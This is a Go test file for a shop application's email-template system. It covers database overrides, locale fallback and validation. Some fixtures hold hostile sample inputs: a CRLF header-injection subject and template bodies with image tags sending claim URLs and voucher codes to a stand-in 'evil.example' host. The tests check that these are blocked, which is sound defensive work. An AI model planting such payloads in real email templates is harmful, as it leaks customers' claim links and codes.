package mail_test

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/akarso/shopanda/internal/domain/mail"
)

type overrideStub struct {
	// key: storeID|name|locale → subject, body
	rows map[string][2]string
	err  error
}

func (s *overrideStub) Get(_ context.Context, storeID, name, locale string) (string, string, error) {
	if s.err != nil {
		return "", "", s.err
	}
	key := storeID + "|" + name + "|" + locale
	row, ok := s.rows[key]
	if !ok {
		return "", "", mail.ErrTemplateNotFound
	}
	return row[0], row[1], nil
}

func TestRenderWithOverrides_DBWins(t *testing.T) {
	reg := mail.NewTemplates()
	reg.Register("order_confirmed", "File subject", "<p>file</p>")
	src := &overrideStub{rows: map[string][2]string{
		"s1|order_confirmed|": {"DB {{.Data.X}}", "<p>db-{{.Data.X}}</p>"},
	}}
	res, err := mail.RenderWithOverrides(context.Background(), reg, src, "s1", "order_confirmed", "en", "a@b.com", mail.EmailData{
		Data: map[string]interface{}{"X": "ok"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if !res.FromOverride {
		t.Fatal("expected FromOverride")
	}
	if res.Message.Subject != "DB ok" || !strings.Contains(res.Message.Body, "db-ok") {
		t.Fatalf("got subject=%q body=%q", res.Message.Subject, res.Message.Body)
	}
}

func TestRenderWithOverrides_SubjectKeepsAmpersand(t *testing.T) {
	reg := mail.NewTemplates()
	reg.Register("order_confirmed", "File", "<p>file</p>")
	src := &overrideStub{rows: map[string][2]string{
		"s1|order_confirmed|": {"Fish & Chips", "<p>body</p>"},
	}}
	res, err := mail.RenderWithOverrides(context.Background(), reg, src, "s1", "order_confirmed", "", "a@b.com", nil)
	if err != nil {
		t.Fatal(err)
	}
	if res.Message.Subject != "Fish & Chips" {
		t.Fatalf("subject = %q, want Fish & Chips (not HTML-escaped)", res.Message.Subject)
	}
}

func TestRenderWithOverrides_SubjectRejectsCRLF(t *testing.T) {
	reg := mail.NewTemplates()
	reg.Register("order_confirmed", "File", "<p>file</p>")
	src := &overrideStub{rows: map[string][2]string{
		"s1|order_confirmed|": {"Line1\r\nInjected", "<p>body</p>"},
	}}
	_, err := mail.RenderWithOverrides(context.Background(), reg, src, "s1", "order_confirmed", "", "a@b.com", nil)
	if err == nil || !strings.Contains(err.Error(), "CR or LF") {
		t.Fatalf("err = %v, want CR or LF", err)
	}
}

func TestRenderWithOverrides_ExactBeatsEmpty(t *testing.T) {
	reg := mail.NewTemplates()
	reg.Register("order_confirmed", "File", "<p>file</p>")
	src := &overrideStub{rows: map[string][2]string{
		"s1|order_confirmed|":   {"Default", "<p>default</p>"},
		"s1|order_confirmed|de": {"German", "<p>de</p>"},
	}}
	res, err := mail.RenderWithOverrides(context.Background(), reg, src, "s1", "order_confirmed", "DE", "a@b.com", nil)
	if err != nil {
		t.Fatal(err)
	}
	if res.Message.Subject != "German" {
		t.Fatalf("subject = %q, want German (canonical de)", res.Message.Subject)
	}
}

func TestRenderWithOverrides_FallsBackToEmptyLocale(t *testing.T) {
	reg := mail.NewTemplates()
	reg.Register("order_confirmed", "File", "<p>file</p>")
	src := &overrideStub{rows: map[string][2]string{
		"s1|order_confirmed|": {"Default", "<p>default</p>"},
	}}
	res, err := mail.RenderWithOverrides(context.Background(), reg, src, "s1", "order_confirmed", "fr", "a@b.com", nil)
	if err != nil {
		t.Fatal(err)
	}
	if res.Message.Subject != "Default" {
		t.Fatalf("subject = %q, want Default", res.Message.Subject)
	}
}

func TestRenderWithOverrides_AuthNameSkipsDB(t *testing.T) {
	reg := mail.NewTemplates()
	reg.Register("password_reset", "File reset", "<p>file</p>")
	src := &overrideStub{rows: map[string][2]string{
		"s1|password_reset|": {"Hijacked", "<p><a href=\"https://evil\">x</a></p>"},
	}}
	res, err := mail.RenderWithOverrides(context.Background(), reg, src, "s1", "password_reset", "en", "a@b.com", nil)
	if err != nil {
		t.Fatal(err)
	}
	if res.FromOverride || res.Message.Subject != "File reset" {
		t.Fatalf("auth template must not use DB: from=%v subject=%q", res.FromOverride, res.Message.Subject)
	}
}

func TestRenderWithOverrides_ClaimAndVoucherSkipDB(t *testing.T) {
	reg := mail.NewTemplates()
	reg.Register("order_claim", "File claim", "<p>file-claim</p>")
	reg.Register("voucher_issued", "File voucher", "<p>file-voucher</p>")
	src := &overrideStub{rows: map[string][2]string{
		"s1|order_claim|": {
			"Hijacked",
			`<img src="https://evil.example/c?u={{.Data.ClaimURL}}"><a href="https://evil.example/claim">x</a><p>{{.Data.ClaimURL}}</p>`,
		},
		"s1|voucher_issued|": {"Hijacked", `<img src="https://evil.example/v?c={{.Data.Codes}}">`},
	}}
	for _, name := range []string{"order_claim", "voucher_issued"} {
		res, err := mail.RenderWithOverrides(context.Background(), reg, src, "s1", name, "en", "a@b.com", nil)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if res.FromOverride || strings.Contains(res.Message.Body, "evil.example") {
			t.Fatalf("%s used DB override: from=%v body=%q", name, res.FromOverride, res.Message.Body)
		}
	}
}

func TestRenderWithOverrides_DeleteReturnsToFile(t *testing.T) {
	reg := mail.NewTemplates()
	reg.Register("order_confirmed", "File subject", "<p>file-body</p>")
	src := &overrideStub{rows: map[string][2]string{}}
	res, err := mail.RenderWithOverrides(context.Background(), reg, src, "s1", "order_confirmed", "en", "a@b.com", nil)
	if err != nil {
		t.Fatal(err)
	}
	if res.FromOverride || res.Message.Subject != "File subject" {
		t.Fatalf("got from=%v subject=%q", res.FromOverride, res.Message.Subject)
	}
}

func TestRenderWithOverrides_UnknownName(t *testing.T) {
	reg := mail.NewTemplates()
	src := &overrideStub{rows: map[string][2]string{}}
	_, err := mail.RenderWithOverrides(context.Background(), reg, src, "s1", "missing", "", "a@b.com", nil)
	if err == nil {
		t.Fatal("expected error")
	}
}

func TestRenderWithOverrides_BadDBBody(t *testing.T) {
	reg := mail.NewTemplates()
	reg.Register("order_confirmed", "File", "<p>file</p>")
	src := &overrideStub{rows: map[string][2]string{
		"s1|order_confirmed|": {"Subj", "{{.Broken"},
	}}
	_, err := mail.RenderWithOverrides(context.Background(), reg, src, "s1", "order_confirmed", "", "a@b.com", nil)
	if err == nil {
		t.Fatal("expected parse error")
	}
	if !strings.Contains(err.Error(), "parse") {
		t.Fatalf("err = %v", err)
	}
}

func TestRenderWithOverrides_NilSrcUsesRegistry(t *testing.T) {
	reg := mail.NewTemplates()
	reg.Register("order_confirmed", "File", "<p>file</p>")
	res, err := mail.RenderWithOverrides(context.Background(), reg, nil, "s1", "order_confirmed", "en", "a@b.com", nil)
	if err != nil {
		t.Fatal(err)
	}
	if res.FromOverride || res.Message.Subject != "File" {
		t.Fatalf("got from=%v subject=%q", res.FromOverride, res.Message.Subject)
	}
}

func TestRenderWithOverrides_SourceError(t *testing.T) {
	reg := mail.NewTemplates()
	reg.Register("order_confirmed", "File", "<p>file</p>")
	boom := errors.New("db down")
	src := &overrideStub{err: boom}
	_, err := mail.RenderWithOverrides(context.Background(), reg, src, "s1", "order_confirmed", "", "a@b.com", nil)
	if !errors.Is(err, boom) {
		t.Fatalf("err = %v", err)
	}
}

func TestEmailTemplate_Validate(t *testing.T) {
	ok := &mail.EmailTemplate{
		StoreID: "s1", Name: "order_confirmed", Subject: "Hi", Body: "<p>x</p>", UpdatedBy: "admin-1",
	}
	if err := ok.Validate(); err != nil {
		t.Fatal(err)
	}
	if ok.Locale != "" {
		t.Fatalf("locale = %q", ok.Locale)
	}
	de := &mail.EmailTemplate{
		StoreID: "s1", Name: "order_confirmed", Locale: "DE", Subject: "Hi", Body: "<p>x</p>", UpdatedBy: "a",
	}
	if err := de.Validate(); err != nil {
		t.Fatal(err)
	}
	if de.Locale != "de" {
		t.Fatalf("canonical locale = %q, want de", de.Locale)
	}
	badName := &mail.EmailTemplate{
		StoreID: "s1", Name: "Bad-Name", Subject: "Hi", Body: "<p>x</p>", UpdatedBy: "a",
	}
	if err := badName.Validate(); err == nil {
		t.Fatal("expected name pattern error")
	}
	for _, name := range []string{"password_reset", "order_claim", "voucher_issued"} {
		blocked := &mail.EmailTemplate{
			StoreID: "s1", Name: name, Subject: "Hi", Body: "<p>x</p>", UpdatedBy: "a",
		}
		if err := blocked.Validate(); err == nil {
			t.Fatalf("expected %q not overridable", name)
		}
	}
	noActor := &mail.EmailTemplate{
		StoreID: "s1", Name: "order_confirmed", Subject: "Hi", Body: "<p>x</p>",
	}
	if err := noActor.Validate(); err == nil {
		t.Fatal("expected updated_by required")
	}
	for _, bad := range []string{"und", "deutsch", "!!!"} {
		inv := &mail.EmailTemplate{
			StoreID: "s1", Name: "order_confirmed", Locale: bad, Subject: "Hi", Body: "<p>x</p>", UpdatedBy: "a",
		}
		if err := inv.Validate(); err == nil {
			t.Fatalf("expected invalid locale %q rejected", bad)
		}
	}
}

func TestParseTemplateLocale(t *testing.T) {
	got, err := mail.ParseTemplateLocale("")
	if err != nil || got != "" {
		t.Fatalf("empty: %q %v", got, err)
	}
	got, err = mail.ParseTemplateLocale("pt-BR")
	if err != nil || got != "pt" {
		t.Fatalf("pt-BR: %q %v", got, err)
	}
	if _, err := mail.ParseTemplateLocale("und"); err == nil {
		t.Fatal("expected und rejected")
	}
}

func TestValidateRenderable(t *testing.T) {
	if err := mail.ValidateRenderable("order_confirmed", "Hi {{.Data.X}}", "<p>{{.Data.X}}</p>", mail.EmailData{
		Data: map[string]interface{}{"X": "ok"},
	}); err != nil {
		t.Fatal(err)
	}
	if err := mail.ValidateRenderable("order_confirmed", "Hi {{", "<p>x</p>", nil); err == nil {
		t.Fatal("expected parse error")
	}
	if err := mail.ValidateRenderable("order_confirmed", "a\nb", "<p>x</p>", nil); err == nil {
		t.Fatal("expected CR/LF reject")
	}
	if err := mail.ValidateRenderable("order_confirmed", `{{printf "a\rb"}}`, "<p>x</p>", nil); err == nil {
		t.Fatal("expected rendered CR/LF reject")
	}
}

func TestRenderWithOverrides_ExactLocale(t *testing.T) {
	reg := mail.NewTemplates()
	reg.Register("order_confirmed", "File", "<p>file</p>")
	src := &overrideStub{rows: map[string][2]string{
		"s1|order_confirmed|": {"Default", "<p>default</p>"},
	}}
	res, err := mail.RenderWithOverrides(context.Background(), reg, src, "s1", "order_confirmed", "de", "a@b.com", nil, mail.WithExactLocale())
	if err != nil {
		t.Fatal(err)
	}
	if res.FromOverride || res.Message.Subject != "File" {
		t.Fatalf("exact must skip empty locale: from=%v subject=%q", res.FromOverride, res.Message.Subject)
	}
	if !res.Fallback || res.Source != mail.OriginBuiltin {
		t.Fatalf("fallback/source = %#v", res)
	}
}

func TestRenderWithOverrides_FallbackMetadata(t *testing.T) {
	reg := mail.NewTemplates()
	reg.Register("order_confirmed", "File", "<p>file</p>")
	src := &overrideStub{rows: map[string][2]string{
		"s1|order_confirmed|": {"Default", "<p>default</p>"},
	}}
	res, err := mail.RenderWithOverrides(context.Background(), reg, src, "s1", "order_confirmed", "de", "a@b.com", nil)
	if err != nil {
		t.Fatal(err)
	}
	if !res.FromOverride || res.Source != "db" || !res.Fallback || res.ResolvedLocale != "" {
		t.Fatalf("expected empty-locale fallback: %#v", res)
	}
}
